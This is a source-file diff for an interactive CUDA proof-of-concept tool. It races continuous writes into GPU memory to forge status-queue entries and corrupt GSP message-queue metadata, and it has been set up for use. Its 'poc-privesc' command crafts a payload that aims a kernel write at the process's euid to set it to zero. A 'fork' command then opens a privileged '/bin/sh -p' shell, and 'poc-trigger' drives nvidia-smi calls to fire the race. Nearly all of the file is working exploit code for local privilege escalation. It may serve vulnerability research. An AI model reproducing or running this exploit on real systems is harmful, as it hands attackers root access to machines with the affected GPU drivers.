@@ -1,0 +1,908 @@
+#include <cuda.h>
+#include <cuda_runtime.h>
+
+#include <algorithm>
+#include <atomic>
+#include <cctype>
+#include <chrono>
+#include <cstdio>
+#include <cstdlib>
+#include <cstring>
+#include <fstream>
+#include <iomanip>
+#include <iostream>
+#include <map>
+#include <mutex>
+#include <sstream>
+#include <string>
+#include <thread>
+#include <vector>
+
+#include <sys/wait.h>
+#include <unistd.h>
+
+#include "checksum_helper.h" // POC checksum calculation
+#include "transfer.cuh"
+
+#define CHECK(call)                                                                                                    \
+    do                                                                                                                 \
+    {                                                                                                                  \
+        cudaError_t err__ = (call);                                                                                    \
+        if (err__ != cudaSuccess)                                                                                      \
+        {                                                                                                              \
+            std::fprintf(stderr, "CUDA error %s @ %s:%d\n", cudaGetErrorString(err__), __FILE__, __LINE__);            \
+            std::exit(EXIT_FAILURE);                                                                                   \
+        }                                                                                                              \
+    } while (0)
+
+#define PACK64(HI, LO) (((static_cast<std::uint64_t>(HI) << 32) | (LO)))
+
+constexpr size_t NR_INUSE_PAYLOAD_ENTRIES = 30;
+constexpr size_t NR_MAX_PAYLOAD_ENTRIES = 4096;
+constexpr size_t PAYLOAD_ENTRY_SIZE = 8;
+constexpr size_t MSG_HEADER_SIZE = 0x30;
+
+// Global GPU buffer information
+unsigned char *g_d_buf = nullptr;
+size_t g_d_buf_size = 0;
+
+// Continuous write management
+struct ContinuousWrite
+{
+    size_t offset;        // Offset within g_d_buf
+    std::uint64_t value;  // Value to write
+    uint64_t write_count; // Number of writes performed
+
+    ContinuousWrite() : offset(0), value(0), write_count(0)
+    {
+    }
+    ContinuousWrite(size_t o, std::uint64_t v) : offset(o), value(v), write_count(0)
+    {
+    }
+};
+
+std::map<size_t, ContinuousWrite> g_continuous_writes; // offset -> ContinuousWrite
+std::atomic<bool> g_cw_thread_should_stop{false};
+std::thread g_cw_thread;
+
+// POC Status Queue management
+struct POCConfig
+{
+    bool initialized;
+    uintptr_t base_address; // Status Queue base address (absolute)
+    uint32_t num_entries;   // 64
+    uint32_t entry_size;    // 4096
+
+    POCConfig() : initialized(false), base_address(0), num_entries(63), entry_size(4096)
+    {
+    }
+};
+
+struct POCContinuousWrite
+{
+    uint32_t seqNum;
+    uint32_t elemCount;
+    bool write_checksum;
+    uint32_t checksum;
+    bool is_payload; // true if this is a payload write (not elemCount write)
+
+    // Computed fields
+    uint32_t entry_index;                   // seqNum % 64
+    uintptr_t entry_address;                // base + index * 4096
+    size_t elemCount_offset;                // offset within g_d_buf for elemCount field
+    size_t checksum_offset;                 // offset within g_d_buf for checksum field
+    std::vector<uintptr_t> payload_offsets; // offsets for payload continuous writes
+
+    POCContinuousWrite()
+        : seqNum(0), elemCount(0), write_checksum(false), checksum(0), is_payload(false), entry_index(0),
+          entry_address(0), elemCount_offset(0), checksum_offset(0)
+    {
+    }
+};
+
+POCConfig g_poc_config;
+std::map<uint32_t, POCContinuousWrite> g_poc_cw_map; // seqNum -> POCContinuousWrite
+std::mutex g_poc_mutex;
+
+// POC Entry-level continuous write (writes full valid entry with checksum)
+struct POCEntryWrite
+{
+    uint32_t seqNum;
+    uint32_t entry_index;
+    uintptr_t entry_address;
+    size_t entry_offset;
+    poc::StatusQueueEntryV2 valid_entry; // Pre-computed valid entry
+
+    POCEntryWrite() : seqNum(0), entry_index(0), entry_address(0), entry_offset(0)
+    {
+    }
+};
+
+std::map<uint32_t, POCEntryWrite> g_poc_entry_map; // seqNum -> POCEntryWrite
+
+__global__ void touch_kernel(const unsigned char *buf, size_t n, unsigned long long *sum)
+{
+    unsigned long long local = 0;
+    size_t tid = threadIdx.x + static_cast<size_t>(blockIdx.x) * blockDim.x;
+    size_t stride = blockDim.x * gridDim.x;
+    for (size_t i = tid; i < n; i += stride)
+    {
+        local += buf[i];
+    }
+    atomicAdd(sum, local);
+}
+
+__global__ void check_d_kernel(const unsigned char *buf, size_t n, unsigned long long *idx)
+{
+    size_t tid = threadIdx.x + static_cast<size_t>(blockIdx.x) * blockDim.x;
+    // size_t stride = blockDim.x * gridDim.x;
+    // *idx = (unsigned long long)-1;
+    if (tid >= 1)
+        return;
+    for (size_t i = 0; i < n; i += 1)
+    {
+        if (buf[i] != 'd')
+        {
+            printf("1\n");
+            *idx = i;
+            return;
+        }
+    }
+}
+
+std::vector<unsigned char> load_bytes(const char *path)
+{
+    std::ifstream ifs(path, std::ios::binary);
+    if (!ifs)
+    {
+        std::fprintf(stderr, "Open file failed: %s\n", path);
+        std::exit(EXIT_FAILURE);
+    }
+    return std::vector<unsigned char>((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
+}
+
+void poc_get_next_n_sequence_number(uint32_t offset, uint32_t &out_slot_nr, uint64_t &out_seqnum)
+{
+    if (!g_poc_config.initialized)
+    {
+        std::cerr << "Error: POC not initialized. Run 'poc-init <base_address>' first." << std::endl;
+        return;
+    }
+
+    uint32_t max_seqnum = 0;
+    uintptr_t buf_base = reinterpret_cast<uintptr_t>(g_d_buf);
+
+    for (uint32_t i = 0; i < g_poc_config.num_entries; i++)
+    {
+        uintptr_t entry_address = g_poc_config.base_address + i * g_poc_config.entry_size;
+        size_t entry_offset = entry_address - buf_base;
+
+        // Read seqNum from device buffer using explicit cudaMemcpy
+        uint32_t seqnum = 0;
+
+        // Bounds check: ensure the computed offset is within our allocated GPU buffer
+        if (entry_offset + 0x24 + sizeof(seqnum) > g_d_buf_size)
+        {
+            std::cerr << "Warning: Computed entry address for slot " << i << " is out of g_d_buf bounds. Skipping."
+                      << std::endl;
+            continue;
+        }
+
+        cudaError_t err = cudaMemcpy(&seqnum, g_d_buf + entry_offset + 0x24, sizeof(seqnum), cudaMemcpyDeviceToHost);
+        std::cout << "Slot " << i << ": seqNum = " << seqnum << std::endl;
+        if (err != cudaSuccess)
+        {
+            // Clear CUDA error and continue
+            cudaGetLastError();
+            continue;
+        }
+
+        if (seqnum > max_seqnum && seqnum < 1000000)
+        {
+            max_seqnum = seqnum;
+            out_slot_nr = i;
+        }
+    }
+    uint32_t count = 0;
+    for (uint32_t next_slot = out_slot_nr + 1; next_slot != out_slot_nr; next_slot++)
+    {
+        if (next_slot >= g_poc_config.num_entries)
+        {
+            next_slot = 0;
+        }
+        uint32_t this_seqnum = 0;
+        uintptr_t entry_address = g_poc_config.base_address + next_slot * g_poc_config.entry_size;
+        size_t entry_offset = entry_address - buf_base;
+        // Read seqNum from device buffer using explicit cudaMemcpy
+        cudaError_t err =
+            cudaMemcpy(&this_seqnum, g_d_buf + entry_offset + 0x24, sizeof(this_seqnum), cudaMemcpyDeviceToHost);
+        if (err != cudaSuccess)
+        {
+            // Clear CUDA error and continue
+            cudaGetLastError();
+            continue;
+        }
+        if (this_seqnum == 0)
+        {
+            continue;
+        }
+        count++;
+        if (count == offset)
+        {
+            out_slot_nr = next_slot;
+            out_seqnum = max_seqnum + offset;
+            return;
+        }
+    }
+}
+
+void dump_mem(void *ptr, size_t n)
+{
+    auto *b = reinterpret_cast<const uint8_t *>(ptr);
+    size_t len = 240;
+
+    for (size_t i = 0; i < len; i += 16)
+    {
+
+        std::cout << "        ";
+
+        // hex part
+        for (size_t j = 0; j < 16; ++j)
+        {
+            if (i + j < len)
+            {
+                std::cout << std::hex << std::setfill('0') << std::setw(2) << (unsigned)b[i + j] << " ";
+            }
+            else
+            {
+                std::cout << "   ";
+            }
+
+            if (j == 7)
+                std::cout << " ";
+        }
+
+        std::cout << " |";
+
+        // ascii part
+        for (size_t j = 0; j < 16 && i + j < len; ++j)
+        {
+            unsigned char c = b[i + j];
+            if (std::isprint(c))
+                std::cout << c;
+            else
+                std::cout << ".";
+        }
+
+        std::cout << "|" << std::endl;
+    }
+    std::cout << std::dec;
+}
+
+bool parse_uint64(const std::string &text, std::uint64_t &out)
+{
+    try
+    {
+        size_t idx = 0;
+        unsigned long long value = std::stoull(text, &idx, 0);
+        if (idx != text.size())
+            return false;
+        out = value;
+        return true;
+    }
+    catch (...)
+    {
+        return false;
+    }
+}
+
+void print_usage(const char *prog)
+{
+    std::fprintf(stderr,
+                 "Usage:\n"
+                 "  %s <file>\n"
+                 "  %s --literal \"your long string ...\"\n",
+                 prog, prog);
+}
+
+unsigned long long touch_buffer(unsigned char *buf, size_t n, unsigned long long *sum, bool verbose = true)
+{
+    CHECK(cudaMemset(sum, 0, sizeof(unsigned long long)));
+    const int threads_per_block = 256;
+    int blocks = static_cast<int>((n + threads_per_block - 1) / threads_per_block);
+    blocks = std::clamp(blocks, 1, 1024);
+
+    auto start = std::chrono::steady_clock::now();
+    touch_kernel<<<blocks, threads_per_block>>>(buf, n, sum);
+    CHECK(cudaGetLastError());
+    CHECK(cudaDeviceSynchronize());
+    auto end = std::chrono::steady_clock::now();
+
+    unsigned long long host_sum = 0;
+    CHECK(cudaMemcpy(&host_sum, sum, sizeof(unsigned long long), cudaMemcpyDeviceToHost));
+
+    if (verbose)
+    {
+        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();
+        std::cout << "Touch completed in " << elapsed << " ms, checksum 0x" << std::hex << host_sum << std::dec
+                  << std::endl;
+    }
+    return host_sum;
+}
+
+unsigned long long find_nd_buffer(unsigned char *buf, size_t n)
+{
+    const int threads_per_block = 256;
+    int blocks = static_cast<int>((n + threads_per_block - 1) / threads_per_block);
+    blocks = std::clamp(blocks, 1, 1024);
+
+    auto start = std::chrono::steady_clock::now();
+    unsigned long long *broken_idx;
+    CHECK(cudaMalloc(&broken_idx, sizeof(unsigned long long)));
+    CHECK(cudaMemset(broken_idx, 0, sizeof(unsigned long long)));
+    check_d_kernel<<<1, 1>>>(buf, n, broken_idx);
+    CHECK(cudaGetLastError());
+    CHECK(cudaDeviceSynchronize());
+    auto end = std::chrono::steady_clock::now();
+
+    unsigned long long host_idx = 0;
+    CHECK(cudaMemcpy(&host_idx, broken_idx, sizeof(unsigned long long), cudaMemcpyDeviceToHost));
+    CHECK(cudaFree(broken_idx));
+
+    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();
+    std::cout << "Buffer scan completed in " << elapsed << " ms, first non-'d' index: " << host_idx << std::endl;
+
+    return host_idx;
+}
+
+int main(int argc, char **argv)
+{
+    setvbuf(stdout, nullptr, _IONBF, 0);
+
+    if (argc < 2)
+    {
+        print_usage(argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    std::string input_path;
+    std::string literal_value;
+    bool use_literal = false;
+
+    for (int i = 1; i < argc; ++i)
+    {
+        std::string arg(argv[i]);
+        if (arg == "--literal")
+        {
+            if (i + 1 >= argc)
+            {
+                std::fprintf(stderr, "--literal expects a string argument\n");
+                return EXIT_FAILURE;
+            }
+            use_literal = true;
+            literal_value = argv[++i];
+        }
+        else if (arg == "--help" || arg == "-h")
+        {
+            print_usage(argv[0]);
+            return EXIT_SUCCESS;
+        }
+        else if (arg.size() && arg[0] == '-')
+        {
+            std::fprintf(stderr, "Unknown option: %s\n", arg.c_str());
+            return EXIT_FAILURE;
+        }
+        else if (input_path.empty())
+        {
+            input_path = arg;
+        }
+        else
+        {
+            std::fprintf(stderr, "Unexpected extra argument: %s\n", arg.c_str());
+            return EXIT_FAILURE;
+        }
+    }
+
+    if (!use_literal && input_path.empty())
+    {
+        print_usage(argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    std::vector<unsigned char> host;
+    if (use_literal)
+    {
+        host.assign(literal_value.begin(), literal_value.end());
+    }
+    else
+    {
+        host = load_bytes(input_path.c_str());
+    }
+
+    if (host.empty())
+    {
+        std::fprintf(stderr, "Input is empty.\n");
+        return EXIT_FAILURE;
+    }
+
+    const size_t n = host.size();
+
+    // Allocate pure GPU device memory
+    CHECK(cudaMalloc(&g_d_buf, n));
+    g_d_buf_size = n;
+    CHECK(cudaMemcpy(g_d_buf, host.data(), n, cudaMemcpyHostToDevice));
+
+    unsigned long long *d_sum = nullptr;
+    CHECK(cudaMalloc(&d_sum, sizeof(unsigned long long)));
+
+    auto t_start = std::chrono::steady_clock::now();
+    unsigned long long h_sum = touch_buffer(g_d_buf, n, d_sum);
+    auto t_ready = std::chrono::steady_clock::now();
+    auto elapsed_ready = std::chrono::duration_cast<std::chrono::milliseconds>(t_ready - t_start).count();
+
+    std::cout << "Checksum (mod 2^64): 0x" << std::hex << h_sum << std::dec << std::endl;
+    std::cout << "GPU device pointer: " << static_cast<void *>(g_d_buf) << std::endl;
+    std::cout << "Data size: " << n << " bytes" << std::endl;
+    std::cout << "Data location: GPU VRAM (fixed, no automatic migration)" << std::endl;
+    std::cout << "Load time: " << std::fixed << std::setprecision(3) << (elapsed_ready / 1000.0) << " s" << std::endl;
+
+    std::uint64_t g_seqnum_val = 0;
+    std::uint32_t g_slot_nr = 0;
+    std::string line;
+    while (true)
+    {
+        std::cout << "\n> " << std::flush;
+        if (!std::getline(std::cin, line))
+            break;
+        if (line.empty())
+            continue;
+
+        std::istringstream iss(line);
+        std::string cmd;
+        if (!(iss >> cmd))
+            continue;
+
+        if (cmd == "poc-init")
+        {
+            std::string addr_str;
+            std::uint64_t raw = 0;
+
+            if (!(iss >> addr_str))
+            {
+                // std::cout << "Usage: poc-init <base_address>" << std::endl;
+                // std::cout << "  Sets the Status Queue base address for POC operations" << std::endl;
+                // std::cout << "  Note: In NO-UVM mode, base_address should be within g_d_buf range" << std::endl;
+                // continue;
+                // void *pt_rw_ptr = openIPCPointer(0);
+                // void *arb_rw_ptr = openIPCPointer(1);
+                // print_memory<<<1,1>>>((uint8_t*)pt_rw_ptr, 100);
+                // cudaDeviceSynchronize();
+                // print_memory<<<1,1>>>((uint8_t*)arb_rw_ptr, 100);
+                // cudaDeviceSynchronize();
+                // std::cout << "Pointers" << reinterpret_cast<uint64_t>(pt_rw_ptr) << ' ' <<
+                // reinterpret_cast<uint64_t>(arb_rw_ptr) << '\n'; uint64_t ofs = getPTOfs("./new_offset.bin");
+                // modify(pt_rw_ptr, ofs, (uint64_t)(0x060000000fff0005)); // Check Status Queue Offset
+                // raw = reinterpret_cast<uint64_t>(arb_rw_ptr) + 0x142000;
+                // std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+                // print_memory<<<1,1>>>((uint8_t*)pt_rw_ptr, 100);
+                // cudaDeviceSynchronize();
+                // print_memory<<<1,1>>>((uint8_t*)raw, 2L * 1024 * 1024);
+                // cudaDeviceSynchronize();
+                // gpuErrchk(cudaPeekAtLastError());
+                // paused();
+                // print_memory<<<1,1>>>((uint8_t*)raw, 2L * 1024 * 1024);
+                // cudaDeviceSynchronize();
+                // gpuErrchk(cudaPeekAtLastError());
+                // paused();
+                raw = reinterpret_cast<uint64_t>(g_d_buf) + find_nd_buffer(g_d_buf, g_d_buf_size) + 0x142000;
+                std::cout << "Auto-detected base address: 0x" << std::hex << raw << std::dec << std::endl;
+            }
+            else
+            {
+                raw = 0;
+                if (!parse_uint64(addr_str, raw))
+                {
+                    std::cout << "Invalid address: " << addr_str << std::endl;
+                    continue;
+                }
+            }
+
+            {
+                std::lock_guard<std::mutex> lock(g_poc_mutex);
+                g_poc_config.base_address = static_cast<uintptr_t>(raw);
+                g_poc_config.initialized = true;
+            }
+
+            std::cout << "[OK] POC status queue initialized" << std::endl;
+            continue;
+        }
+
+        if (cmd == "poc-cw-entry0-checksum")
+        {
+            if (!g_poc_config.initialized)
+            {
+                std::cout << "Error: POC not initialized. Run 'poc-init <base_address>' first." << std::endl;
+                continue;
+            }
+
+            if (iss.rdbuf()->in_avail() > 0)
+            {
+                std::cout << "[ERROR] Invalid arguments" << std::endl;
+                continue;
+            }
+
+            std::uint64_t seqnum_val = 0;
+            std::uint32_t slot_nr = 0;
+            poc_get_next_n_sequence_number(6, slot_nr, seqnum_val);
+            slot_nr = slot_nr % g_poc_config.num_entries;
+            std::cout << "[POC-CW] Auto seqnum: " << seqnum_val << "@" << slot_nr << std::endl;
+
+            uint32_t seqnum = static_cast<uint32_t>(seqnum_val);
+            g_seqnum_val = seqnum;
+            g_slot_nr = slot_nr;
+            // Calculate entry address
+            uint32_t entry_index = slot_nr; // seqnum % g_poc_config.num_entries;
+            uintptr_t entry_address = g_poc_config.base_address + entry_index * g_poc_config.entry_size;
+            uintptr_t buf_base = reinterpret_cast<uintptr_t>(g_d_buf);
+
+            if (entry_address < buf_base || entry_address + g_poc_config.entry_size > buf_base + g_d_buf_size)
+            {
+                std::cout << "Error: Entry address 0x" << std::hex << entry_address << std::dec
+                          << " is outside g_d_buf range!" << std::endl;
+                continue;
+            }
+
+            size_t entry_offset = entry_address - buf_base;
+
+            // Create valid entry with elemCount=17 and correct checksum
+            poc::StatusQueueEntryV2 valid_entry = poc::create_attack_entry(seqnum);
+
+            dump_mem(&valid_entry, sizeof(valid_entry));
+
+            uint32_t batch_count = 10000;
+
+            std::thread entry_cw_thread([entry_offset, valid_entry, batch_count]() {
+                while (!g_cw_thread_should_stop.load())
+                {
+                    for (uint32_t i = 0; i < batch_count; i++)
+                    {
+                        cudaError_t status =
+                            cudaMemcpy(g_d_buf + entry_offset, &valid_entry, 96, cudaMemcpyHostToDevice);
+                        if (status != cudaSuccess)
+                        {
+                            std::cerr << "[POC-CW-ENTRY] cudaMemcpy failed: " << cudaGetErrorString(status)
+                                      << std::endl;
+                            return;
+                        }
+                    }
+                }
+            });
+
+            entry_cw_thread.detach();
+            g_cw_thread_should_stop.store(false);
+
+            std::cout << "[OK] POC entry-level continuous write started:" << std::endl;
+            std::cout << "  seqNum:            " << seqnum << std::endl;
+            std::cout << "  Entry index:       " << entry_index << std::endl;
+            std::cout << "  Batch count:       " << batch_count << std::endl;
+            continue;
+        }
+
+        if (cmd == "fork")
+        {
+            pid_t pid = fork();
+            if (pid == -1)
+            {
+                perror("fork");
+            }
+            else if (pid == 0)
+            {
+                // Child
+                std::cout << "In child process (PID: " << getpid() << ")" << std::endl;
+
+                uid_t euid = geteuid();
+
+                std::cout << "Effective UID: " << euid << std::endl;
+
+                execl("/bin/sh", "sh", "-p", (char *)NULL);
+                // If execl returns, it failed:
+                perror("execl");
+                _exit(1); // use _exit in child to avoid flushing parent's stdio buffers
+            }
+            else
+            {
+                // Parent: wait for the specific child to finish
+                int status = 0;
+                pid_t w;
+                do
+                {
+                    w = waitpid(pid, &status, 0); // block until child exits
+                } while (w == -1 && errno == EINTR); // retry if interrupted by a signal
+
+                if (w == -1)
+                {
+                    perror("waitpid");
+                }
+                else
+                {
+                    if (WIFEXITED(status))
+                    {
+                        std::cout << "Child " << pid << " exited with status " << WEXITSTATUS(status) << std::endl;
+                    }
+                    else if (WIFSIGNALED(status))
+                    {
+                        std::cout << "Child " << pid << " killed by signal " << WTERMSIG(status) << std::endl;
+                    }
+                    else
+                    {
+                        std::cout << "Child " << pid << " ended with status 0x" << std::hex << status << std::dec
+                                  << std::endl;
+                    }
+                }
+            }
+        }
+
+        // POC Privilege Escalation Attack - Write 0 to euid
+        if (cmd == "poc-privesc")
+        {
+            if (!g_poc_config.initialized)
+            {
+                std::cout << "Error: POC not initialized. Run 'poc-init <base_address>' first." << std::endl;
+                continue;
+            }
+
+            std::string pid_str = "0";
+
+            // Optional: target PID
+            if (iss >> pid_str)
+            {
+                // Validate PID
+                std::uint64_t pid_val = 0;
+                if (!parse_uint64(pid_str, pid_val))
+                {
+                    std::cout << "Invalid target_pid: " << pid_str << std::endl;
+                    continue;
+                }
+            }
+
+            // Set target PID in sysfs if provided and not 0
+            if (pid_str != "0")
+            {
+                FILE *f = fopen("/sys/kernel/cred_helper/pid", "w");
+                if (f)
+                {
+                    fprintf(f, "%s", pid_str.c_str());
+                    fclose(f);
+                }
+                else
+                {
+                    std::cout << "[WARN] Cannot write cred_helper pid" << std::endl;
+                }
+            }
+            else
+            {
+                // Reset to current process
+                FILE *f = fopen("/sys/kernel/cred_helper/pid", "w");
+                if (f)
+                {
+                    fprintf(f, "0");
+                    fclose(f);
+                }
+            }
+
+            // Read euid address from sysfs
+            std::uint64_t euid_addr = 0;
+            FILE *f = fopen("/sys/kernel/cred_helper/euid_addr", "r");
+            if (!f)
+            {
+                std::cout << "Error: Cannot read /sys/kernel/cred_helper/euid_addr" << std::endl;
+                continue;
+            }
+
+            if (fscanf(f, "%lx", &euid_addr) != 1)
+            {
+                std::cout << "Error: Failed to parse euid address from sysfs" << std::endl;
+                fclose(f);
+                continue;
+            }
+            fclose(f);
+
+            if (euid_addr == 0)
+            {
+                std::cout << "Error: Invalid euid address (0x0) from sysfs" << std::endl;
+                continue;
+            }
+
+            std::uint64_t seqnum_val = g_seqnum_val + 16;
+            std::uint32_t slot_nr = g_slot_nr + 16;
+            slot_nr = slot_nr % g_poc_config.num_entries;
+
+            // Read current euid value for display
+            std::uint64_t current_euid = 0;
+            f = fopen("/sys/kernel/cred_helper/current_ids", "r");
+            if (f)
+            {
+                char line[256];
+                if (fgets(line, sizeof(line), f))
+                {
+                    sscanf(line, "uid=%*u euid=%lu", &current_euid);
+                }
+                fclose(f);
+            }
+
+            // Calculate Element 16 position
+            uint32_t overflow_entry_index = (slot_nr) % g_poc_config.num_entries;
+            uintptr_t overflow_entry_address =
+                g_poc_config.base_address + overflow_entry_index * g_poc_config.entry_size;
+
+            // Calculate offset from g_d_buf
+            uintptr_t buf_base = reinterpret_cast<uintptr_t>(g_d_buf);
+            size_t entry_offset = overflow_entry_address - buf_base;
+            size_t payload_offset = entry_offset + 0x00;
+            std::uint64_t payload[NR_MAX_PAYLOAD_ENTRIES] = {
+                0,
+            };
+
+            poc::StatusQueueEntryV2 attack_entry = poc::create_attack_entry(seqnum_val);
+            // Data pointers (+0x00 to +0x48)
+            payload[0] = 0x0000000000000000ULL; // 0x0 pOurTxHdr;
+            payload[1] = 0x0000000000000000ULL; // 0x8 pTheirTxHdr;
+            payload[2] = 0x0000000000000000ULL; // 0x10 pOurRxHdr;
+            payload[3] = 0x0000000000000000ULL; // 0x18 pTheirRxHdr;
+            payload[4] = 0x0000000000000000ULL; // 0x20 pOurEntries;
+            payload[5] = 0x0000000000000000ULL; // 0x28 pTheirEntries;
+            payload[6] = 0x0000000000000000ULL; // 0x30 pReadIncoming;
+            payload[7] = 0x0000000000000000ULL; // 0x38 pWriteIncoming;
+            payload[8] = euid_addr;             // 0x40 pReadOutgoing;
+            payload[9] = 0x0000000000000000ULL; // 0x48 pWriteOutgoing;
+
+            // msgqTxHeader tx (+0x50 to +0x67)
+            payload[10] = 0x0000000000000000ULL;
+            payload[11] = 0x0000000000000000ULL;
+            payload[12] = 0x0000000000000000ULL;
+
+            // +0x68 to +0x7F with txLinked=1
+            payload[13] = 0x0000000000000000ULL;
+            payload[14] = 0x0000000000000000ULL;
+            payload[15] = 0x0000000000000001ULL; // +0x78: txLinked=1
+
+            // RX queue metadata (+0x80 to +0x9F)
+            // (-7) + 17 - 10 = 0
+            // msgCount must be > 17 for msgqRxMarkConsumed to work
+            payload[16] = 0x0000100000000400ULL; // +0x80-0x87: rx.version=0x400, rx.size=0x1000
+            payload[17] = 0x0000000a0000000aULL; // +0x88-0x8F: msgSize=0x40(64), msgCount=0x40(64)
+            payload[18] = 0x0000002000000001ULL; // +0x90-0x97: writePtr=1, flags=0x20
+            payload[19] = 0xfffffff900001000ULL; // +0x98-0x9F: rxHdrOff=0x1000, entryOff=0x40
+
+            // Calculate rxReadPtr to make write value = 0
+            // When GSP calls msgqRxMarkConsumed(handle, 17):
+            //   rxReadPtr += 17
+            //   write_value = rxReadPtr % msgCount
+            // We want: (rxReadPtr + 17) % 64 = 0
+            // So: rxReadPtr = 64 - 17 = 47
+            // Furthermore, we need to ensure rxAvail >= number
+            // of elements we want to consume (17), so set rxAvail=20
+            payload[20] = 0x000000140000002fULL; // rxReadPtr=47, rxAvail=20
+
+            // Function pointers (+0xA8 onwards)
+            payload[21] = 0x0000000000000000ULL; // +0xA8: fcnNotify=NULL
+            payload[22] = 0x0000000000000000ULL; // +0xB0: fcnNotifyArg (NULL is safe)
+            payload[23] = 0x0000000000000000ULL; // +0xB8: fcnBackendRw (NULL = direct write)
+            payload[24] = 0x0000000000000000ULL; // +0xC0: fcnBackendRwArg
+            payload[25] = 0x0000000000000000ULL; // +0xC8: fcnInvalidate
+            payload[26] = 0x0000000000000000ULL; // +0xD0: fcnFlush
+            payload[27] = 0x0000000000000000ULL; // +0xD8: fcnZero
+            payload[28] = 0xdeadbeefdeadcafeULL; // +0xE0: fcnBarrier
+            payload[29] = 0x0000000000000000ULL; // +0xE8: padding/extra
+
+            attack_entry.elemCount = 0;
+            attack_entry.rpc_length = PAYLOAD_ENTRY_SIZE * NR_INUSE_PAYLOAD_ENTRIES - MSG_HEADER_SIZE;
+
+            payload[4] = PACK64(attack_entry.seqNum, 0);
+            payload[5] = PACK64(attack_entry.reserved, attack_entry.elemCount);
+            payload[6] = PACK64(attack_entry.rpc_signature, attack_entry.rpc_version);
+            payload[7] = PACK64(attack_entry.rpc_messageId, attack_entry.rpc_length);
+            uint32_t chksum = poc::calculate_checksum(payload, 240);
+            std::cout << "Calculated checksum = " << std::hex << std::setw(16) << chksum << std::dec << std::endl;
+            payload[4] = PACK64(attack_entry.seqNum, chksum);
+
+            uint32_t batch_count = 10000;
+            dump_mem(&payload, sizeof(payload));
+            std::thread privesc_thread([payload_offset, payload, batch_count]() {
+                std::uint64_t total_batches = 0;
+                while (!g_cw_thread_should_stop.load())
+                {
+                    for (uint32_t i = 0; i < batch_count; i++)
+                    {
+                        cudaError_t status = cudaMemcpy(g_d_buf + payload_offset, payload, 240, cudaMemcpyHostToDevice);
+                        if (status != cudaSuccess)
+                        {
+                            std::cerr << "[PRIVESC] cudaMemcpy failed: " << cudaGetErrorString(status) << std::endl;
+                            return;
+                        }
+                        total_batches++;
+                    }
+                }
+            });
+            privesc_thread.detach();
+            g_cw_thread_should_stop.store(false);
+            std::cout << "Continuous write started (" << batch_count << " batches/cycle)" << std::endl;
+            continue;
+        }
+
+        if (cmd == "poc-attack-get-seq")
+        {
+            // Scan all 64 entries to find max seqNum
+            uint32_t slot_nr = 0;
+            uint64_t max_seqnum = 0;
+            poc_get_next_n_sequence_number(0, slot_nr, max_seqnum);
+            if (max_seqnum == 0)
+            {
+                std::cout << "Error: No valid entries found or POC not initialized." << std::endl;
+                continue;
+            }
+
+            std::cout << "[OK] Max seqNum found: " << max_seqnum << "@" << slot_nr << std::endl;
+            continue;
+        }
+
+        if (cmd == "poc-trigger")
+        {
+            std::string count_str;
+            uint32_t count = 1; // Default: 1 operation (changed for non-blocking)
+
+            if (iss >> count_str)
+            {
+                std::uint64_t count_val = 0;
+                if (!parse_uint64(count_str, count_val))
+                {
+                    std::cout << "Invalid count: " << count_str << std::endl;
+                    continue;
+                }
+                count = static_cast<uint32_t>(count_val);
+            }
+
+            // Run in background so user can immediately issue 'stop' command
+            std::ostringstream bg_cmd;
+            bg_cmd << "(for i in $(seq 1 " << count << "); do "
+                   << "nvidia-smi -q -d POWER > /dev/null 2>&1; "
+                   << "done) &";
+
+            int ret = system(bg_cmd.str().c_str());
+
+            if (ret == 0)
+            {
+                std::cout << "[OK] Started " << count << " nvidia-smi operation(s) in background" << std::endl;
+            }
+            else
+            {
+                std::cout << "[ERROR] Failed to start background operations" << std::endl;
+            }
+
+            continue;
+        }
+
+        if (cmd == "whoami")
+        {
+            uid_t uid = getuid();
+            uid_t euid = geteuid();
+
+            std::cout << "User identity check:" << std::endl;
+            std::cout << "  Real UID:      " << uid << std::endl;
+            std::cout << "  Effective UID: " << euid << std::endl;
+
+            continue;
+        }
+
+        if (cmd == "quit" || cmd == "exit" || cmd == "q")
+        {
+            break;
+        }
+
+        std::cout << "Unknown command: " << cmd << std::endl;
+    }
+
+    CHECK(cudaFree(d_sum));
+    CHECK(cudaFree(g_d_buf));
+    return EXIT_SUCCESS;
+}
